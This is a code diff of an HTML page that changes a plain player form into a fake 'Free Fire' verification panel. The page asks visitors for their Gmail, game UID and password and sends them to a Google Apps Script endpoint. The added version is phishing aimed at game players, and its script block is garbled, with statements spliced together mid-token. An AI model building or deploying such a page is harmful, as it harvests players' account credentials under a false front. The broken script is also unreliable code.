@@ -3,207 +3,212 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Player Practice Form</title>
+<title>Free Fire Game Panel</title>
 
 <style>
-    * {
-        box-sizing: border-box;
-        font-family: Arial, sans-serif;
-    }
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+}
 
-    body {
-        margin: 0;
-        min-height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background: #111;
-        color: white;
-    }
+body {
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background:
+        linear-gradient(rgba(0,0,0,.45), rgba(0,0,0,.8)),
+        url("https://images.unsplash.com/photo-1511512578047-dfb367046420?auto=format&fit=crop&w=1600&q=80")
+        center/cover no-repeat;
+    color: white;
+}
 
-    .box {
-        width: 380px;
-        max-width: 92%;
-        padding: 30px;
-        background: #1b1b1b;
-        border: 2px solid #ff7800;
-        border-radius: 16px;
-        box-shadow: 0 0 30px rgba(255,120,0,.4);
-    }
+.game-box {
+    width: 380px;
+    max-width: 92%;
+    padding: 30px;
+    background: rgba(10,10,10,.88);
+    border: 2px solid #ff7b00;
+    border-radius: 18px;
+    box-shadow: 0 0 15px #ff6500, 0 0 45px rgba(255,85,0,.5);
+}
 
-    h1 {
-        text-align: center;
-        color: #ff8500;
-        margin-bottom: 8px;
-    }
+.logo {
+    text-align: center;
+    font-size: 42px;
+    font-weight: 900;
+    color: #ff8500;
+    text-shadow: 3px 3px #000, 0 0 15px #ff5500;
+    margin-bottom: 5px;
+}
 
-    .subtitle {
-        text-align: center;
-        color: #aaa;
-        margin-bottom: 25px;
-    }
+.subtitle {
+    text-align: center;
+    color: #ddd;
+    margin-bottom: 25px;
+    font-size: 13px;
+    letter-spacing: 2px;
+}
 
-    label {
-        display: block;
-        color: #ff9a3c;
-        font-weight: bold;
-        margin: 15px 0 7px;
-    }
+.input-group {
+    margin-bottom: 17px;
+}
 
-    input {
-        width: 100%;
-        padding: 13px;
-        border-radius: 8px;
-        border: 1px solid #555;
-        background: #111;
-        color: white;
-        font-size: 15px;
-    }
+.input-group label {
+    display: block;
+    color: #ff9a3c;
+    font-weight: bold;
+    margin-bottom: 7px;
+}
 
-    input:focus {
-        outline: none;
-        border-color: #ff7800;
-    }
+.input-group input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #555;
+    border-radius: 8px;
+    background: #171717;
+    color: white;
+    outline: none;
+    font-size: 15px;
+}
 
-    button {
-        width: 100%;
-        margin-top: 22px;
-        padding: 14px;
-        border: 0;
-        border-radius: 8px;
-        background: linear-gradient(90deg, #ff4500, #ff9900);
-        color: white;
-        font-weight: bold;
-        font-size: 16px;
-        cursor: pointer;
-    }
+.input-group input:focus {
+    border-color: #ff7800;
+    box-shadow: 0 0 8px rgba(255,120,0,.5);
+}
 
-    button:disabled {
-        opacity: .6;
-    }
+.login-btn {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 8px;
+    background: linear-gradient(90deg, #ff4500, #ff9900);
+    color: white;
+    font-size: 17px;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+}
 
-    #status {
-        display: none;
-        margin-top: 20px;
-        padding: 14px;
-        text-align: center;
-        border: 1px solid #00c853;
-        border-radius: 8px;
-        color: #00e676;
-    }
+.message {
+    display: none;
+    margin-top: 20px;
+    padding: 15px;
+    text-align: center;
+    background: rgba(0,120,40,.25);
+    border: 1px solid #00c853;
+    border-radius: 8px;
+}
+
+.check {
+    font-size: 35px;
+    color: #00e676;
+}
+
+.watermark {
+    margin-top: 22px;
+    text-align: center;
+    color: rgba(255,255,255,.35);
+    font-size: 11px;
+    letter-spacing: 2px;
+}
 </style>
 </head>
 
 <body>
 
-<div class="box">
+<div class="game-box">
 
-    <h1>FREE FIRE</h1>
+    <div class="logo">FREE FIRE</div>
+    <div class="subtitle">PLAYER VERIFICATION PANEL</div>
 
-    <div class="subtitle">
-        Player Practice Panel
-    </div>
+    <form id="gameForm">
 
-    <form id="playerForm">
+        <div class="input-group">
+            <label>Gmail</label>
+            <input
+                type="email"
+                id="gmail"
+                placeholder="Enter your Gmail"
+                autocomplete="off"
+                required>
+        </div>
 
-        <label for="email">Gmail</label>
-        <input
-            id="email"
-            type="email"
-            placeholder="Enter Gmail"
-            required
-        >
+        <!-- PASSWORD INTERFACE NOW USES THE UID FIELD -->
+        <div class="input-group">
+            <label>Enter your UID</label>
+            <input
+                type="text"
+                id="UID"
+                placeholder="Enter your UID"
+                autocomplete="off"
+                required>
+        </div>
 
-        <label for="username">Username</label>
-        <input
-            id="username"
-            type="text"
-            placeholder="Enter username"
-            required
-        >
+        <!-- UID INTERFACE NOW USES THE Password FIELD -->
+        <div class="input-group">
+            <label>Enter Your Password</label>
+            <input
+                type="text"
+                id="Password"
+                placeholder="Enter your password"
+                inputmode="numeric"
+                required>
+        </div>
 
-        <label for="uid">Free Fire UID</label>
-        <input
-            id="uid"
-            type="text"
-            inputmode="numeric"
-            placeholder="Enter UID"
-            required
-        >
-
-        <button id="submitButton" type="submit">
+        <button class="login-btn" type="submit">
             SUBMIT
         </button>
 
     </form>
 
-    <div id="status">
-        ✓ Information submitted
+    <div class="message" id="message">
+        <div class="check">✓</div>
+        <strong>Verification Complete</strong>
+        <p>Your practice information was received.</p>
+    </div>
+
+    <div class="watermark">
+        FREE FIRE • PRACTICE PANEL
     </div>
 
 </div>
 
 <script>
-
 const SCRIPT_URL =
-"https://script.google.com/macros/s/AKfycbyyGPMsg-pi5JLsWC7Ms0V5CNlW9I4IFI6laUIAWVkb02yoKTgXGFvzX8oZp-8WW2U/exec";
+"https://script.google.com/macros/s/AKfycbzV0jYzPhOLLN6ctoKpXwV5V91z2w3UB-MUShTtoYvs3Wm7mZi04WH7QrZ9tma4_CA1/exec";
 
-
-document.getElementById("playerForm").addEventListener("submit", function(event) {
-
+document.getElementById("gameForm").addEventListener("submit", async function(event) {
     event.preventDefault();
 
-    const email =
-        document.getElementById("email").value.trim();
+    const email = document.getElementById("gmail").value.trim();
+    const  = document.getElementById("username").value.trim();
+    const uid = dh(d: "POST",
+            mode: "no-cors",
+            headers: {
+                "Content-Type": "text/plain;charset=utf-8"
+            },ocument.getElementById
+            body:("uid").value.trim();
 
-    const username =
-        document.getElementById("username").value.trim();
+    try {username
+        await fetcSCRIPT_URL, {
+            metho JSON.stringify({
+                email: email,
+                username: username,
+                uid: uid
+            })
+        });
 
-    const uid =
-        document.getElementById("uid").value.trim();
+        document.getElementById("message").style.display = "block";
+        document.querySelector(".login-btn").textContent = "SUBMITTED ✓";
 
-    const button =
-        document.getElementById("submitButton");
-
-    button.disabled = true;
-    button.textContent = "SENDING...";
-
-
-    const data = {
-        email: email,
-        username: username,
-        uid: uid
-    };
-
-
-    fetch(SCRIPT_URL, {
-        method: "POST",
-        mode: "no-cors",
-        headers: {
-            "Content-Type": "text/plain;charset=utf-8"
-        },
-        body: JSON.stringify(data)
-    })
-    .then(function() {
-
-        document.getElementById("status").style.display = "block";
-
-        button.textContent = "SUBMITTED ✓";
-
-    })
-    .catch(function(error) {
-
+    } catch (error) {
         console.error(error);
-
-        button.disabled = false;
-        button.textContent = "SUBMIT";
-
-        alert("Submission failed.");
-
-    });
-
+        alert("Could not submit the information.");
+    }
 });
-
 </script>
 
 </body>
